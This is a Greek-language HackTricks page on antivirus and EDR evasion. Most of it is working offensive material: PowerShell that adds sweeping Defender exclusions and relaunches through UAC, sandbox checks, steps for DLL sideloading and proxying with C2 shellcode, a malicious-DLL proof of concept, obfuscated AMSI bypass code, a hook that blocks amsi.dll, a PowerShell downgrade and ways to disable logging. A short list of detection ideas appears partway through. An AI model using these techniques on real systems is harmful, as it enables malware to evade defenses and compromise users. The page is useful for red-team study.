# Παρακάμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Σταματήστε το Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender παριστάνοντας άλλο AV.
- [Απενεργοποιήστε το Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **να ζητήσουν από τον χρήστη ανύψωση δικαιωμάτων** and only then εξουδετερώσουν το Defender. Η ροή είναι απλή:

1. Probe for administrative context with `net session`. Η εντολή επιτυγχάνει μόνο όταν ο καλών έχει admin rights, οπότε μια αποτυχία υποδεικνύει ότι ο loader τρέχει ως standard user.
2. Immediately relaunch itself with the `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” λογισμικό, οπότε το prompt συνήθως γίνεται αποδεκτό, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Γενικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτηθούν αυξημένα δικαιώματα, αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν την υπηρεσία εντελώς. Ο loader πρώτα σκοτώνει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και μετά εφαρμόζει **εξαιρετικά ευρείες εξαιρέσεις** ώστε κάθε προφίλ χρήστη, κατάλογος συστήματος και αφαιρούμενος δίσκος να μην μπορούν να σαρωθούν:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Ο βρόχος διασχίζει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks, κ.λπ.) οπότε **οποιοδήποτε μελλοντικό payload που θα τοποθετηθεί οπουδήποτε στο δίσκο αγνοείται**.
- Ο αποκλεισμός κατά επέκταση .sys είναι μελλοντοστραφής—οι attackers κρατούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να ξαναενοχλήσουν τον Defender.
- Όλες οι αλλαγές καταλήγουν κάτω από το HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions, επιτρέποντας σε επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις επιμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή δεν σταματάει καμία υπηρεσία του Defender, naïve health checks συνεχίζουν να αναφέρουν «antivirus active» ακόμα κι αν το real-time inspection ποτέ δεν αγγίζει αυτές τις διαδρομές.

## **AV Evasion Methodology**

Προς το παρόν, τα AVs χρησιμοποιούν διάφορες μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Static detection**

Το static detection επιτυγχάνεται σημαίνοντας γνωστές malicious strings ή arrays of bytes μέσα σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε πιάσει πιο εύκολα, αφού πιθανότατα έχουν ήδη αναλυθεί και σημαδευτεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψεις αυτό το είδος ανίχνευσης:

- **Encryption**

Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιον loader για να το αποκρυπτογραφήσεις και να το τρέξεις στη μνήμη.

- **Obfuscation**

Κάποιες φορές το μόνο που χρειάζεται είναι να αλλάξεις μερικά strings στο binary ή στο script σου για να το περάσεις από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για έλεγχο έναντι του Windows Defender static detection είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλαπλά segments και μετά αναθέτει στον Defender να σαρώσει το κάθε ένα ξεχωριστά — έτσι μπορεί να σου πει ακριβώς ποιες είναι οι flagged strings ή bytes στο binary σου.

Συνιστώ ανεπιφύλακτα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτικό AV Evasion.

### **Dynamic analysis**

Το dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρατηρεί για malicious activity (π.χ. προσπαθεί να αποκρυπτογραφήσει και να διαβάσει τα passwords του browser, να κάνει minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο μπερδεμένο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας πολύ καλός τρόπος παράκαμψης του AV's dynamic analysis. Τα AVs έχουν πολύ μικρό χρόνο για να σαρώσουν αρχεία ώστε να μην διαταράσσουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλά να παραβλέψουν το sleep ανάλογα με το πώς είναι υλοποιημένο.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους (π.χ. < 2GB RAM), αλλιώς θα επιβράδυναν τη μηχανή του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα — δεν θα έχει εφαρμοστεί τα πάντα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο workstation είναι joined στο domain "contoso.local", μπορείς να κάνεις έλεγχο στο domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις ορίσει — αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμά σου να τερματίσει.

Αποδείχθηκε ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH, οπότε μπορείς να ελέγξεις για το computer name στο malware σου πριν την detonation — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για να αντιπαρατεθείς με Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως έχουμε πει πριν σε αυτό το post, τα **δημόσια εργαλεία** τελικά **θα εντοπιστούν**, οπότε θα πρέπει να αναρωτηθείς κάτι:

Για παράδειγμα, αν θέλεις να dump-άρεις το LSASS, **πραγματικά χρειάζεται να χρησιμοποιήσεις το mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump στο LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανώς ένα από τα, αν όχι το πιο flagged κομμάτι malware από AVs και EDRs — ενώ το project είναι πολύ καλό, είναι επίσης εφιάλτης να το δουλεύεις για να ξεφύγεις από AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, βεβαιώσου να **απενεργοποιήσεις την automatic sample submission** στον defender, και σε παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΣΕΙΣ ΣΤΟ VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion σε μακροπρόθεσμο ορίζοντα. Αν θέλεις να ελέγξεις αν το payload σου ανιχνεύεται από κάποιο συγκεκριμένο AV, εγκατέστησέ το σε μια VM, προσπάθησε να απενεργοποιήσεις την automatic sample submission, και δοκίμασέ το εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε τη χρήση DLLs για evasion**, από την εμπειρία μου, τα DLL files συνήθως **ανιχνεύονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις εντοπισμό σε ορισμένες περιπτώσεις (εφόσον το payload σου έχει τρόπο να τρέξει ως DLL βεβαίως).

Όπως φαίνεται στην εικόνα, ένα DLL Payload από Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με DLL files για να γίνεις πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader τοποθετώντας τόσο την victim application όσο και τα malicious payload(s) δίπλα-δίπλα.

Μπορείς να ελέγξεις για προγράμματα που είναι επιρρεπή σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το παρακάτω powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα προγραμμάτων ευάλωτων σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL που προσπαθούν να φορτώσουν.

Συστήνω ανεπιφύλακτα να **εξερευνήσετε τα DLL Hijackable/Sideloadable programs μόνοι σας**, αυτή η τεχνική είναι αρκετά stealthy αν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable programs, είναι πιθανό να εντοπιστείτε εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα περιμένει συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν 0/26 ποσοστό εντοπισμού στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συνιστώ θερμά** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε πιο διεξοδικά.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Φορτώσει `TargetDll` αν δεν έχει ήδη φορτωθεί
- Επιλύσει `TargetFunc` από αυτό

Βασικές συμπεριφορές προς κατανόηση:
- Αν `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).
- Αν `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που πραγματοποιεί την forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που εξάγει μια function forwarded σε ένα non-KnownDLL module name, και στη συνέχεια συντοπίστε (co-locate) εκείνο το signed DLL με ένα attacker-controlled DLL που έχει ακριβώς το όνομα του forwarded target module. Όταν η forwarded export καλείται, ο loader επιλύει την forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε τη υπογεγραμμένη DLL του συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο φορτωτής ακολουθεί την προώθηση προς `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο φορτωτής φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder των Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από non-system paths, ακολουθούμενα από φόρτωση non-KnownDLLs με το ίδιο base name από εκείνο τον κατάλογο
- Ειδοποιήστε για αλυσίδες process/module όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` υπό user-writable paths
- Εφαρμόστε πολιτικές code integrity (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — αυτό που λειτουργεί σήμερα μπορεί να ανιχνευθεί αύριο, οπότε ποτέ μην βασίζεστε μόνο σε ένα εργαλείο· αν είναι δυνατόν, προσπαθήστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στο δίσκο**, οπότε αν μπορούσατε με κάποιο τρόπο να εκτελέσετε payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει κάτι για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη σε αυτά τα στοιχεία των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάζουν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα του script σε μια μορφή που είναι μη κρυπτογραφημένη και μη obfuscated.

Το τρέξιμο του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει στην αρχή `amsi:` και μετά τη διαδρομή προς το εκτελέσιμο από το οποίο τρέχει το script, σε αυτή την περίπτωση, powershell.exe

Δεν αφήσαμε κανένα αρχείο στο δίσκο, αλλά παρ' όλα αυτά πιάσαμε σε-memory εξαιτίας του AMSI.

Επιπλέον, ξεκινώντας από **.NET 4.8**, το C# code περνάει επίσης από AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή χαμηλότερα) για in-memory execution εάν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για αποφυγή ανίχνευσης.

Ωστόσο, το AMSI έχει τη δυνατότητα να απο-obfuscate τα scripts ακόμη και αν έχουν πολλαπλά επίπεδα, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό την καθιστά όχι τόσο απλή στην παράκαμψη. Παρόλα αυτά, μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας μια DLL μέσα στη διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατό να την παραποιήσετε εύκολα ακόμη και όταν τρέχετε ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να αποφύγουν το AMSI scanning.

**Forcing an Error**

Αναγκάζοντας την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα powershell διεργασία. Αυτή η γραμμή έχει φυσικά επισημανθεί από το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Εδώ είναι ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνης για το σάρωμα της εισόδου που παρέχει ο χρήστης) και την επανεγγραφή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο αναλυτική εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφότου το `amsi.dll` φορτωθεί στην τρέχουσα διεργασία. Μια αξιόπιστη, ανεξάρτητη από τη γλώσσα παράκαμψη είναι να τοποθετηθεί ένα user‑mode hook στην `ntdll!LdrLoadDll` που επιστρέφει σφάλμα όταν το ζητούμενο module είναι `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται σαρώσεις για αυτή τη διεργασία.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί τόσο σε PowerShell, WScript/CScript όσο και σε custom loaders (οτιδήποτε που διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε με παροχή των scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μακροσκελή command‑line artefacts.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` καλώντας `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Αφαίρεση της ανιχνευόμενης υπογραφής**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευόμενη υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Εάν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging είναι μια δυνατότητα που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για επιθεώρηση και αντιμετώπιση προβλημάτων, αλλά μπορεί επίσης να είναι ένα **πρόβλημα για τους επιτιθέμενους που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις παρακάτω τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Εάν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawn-άρετε ένα PowerShell χωρίς άμυνες (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Obfuscation

> [!TIP]
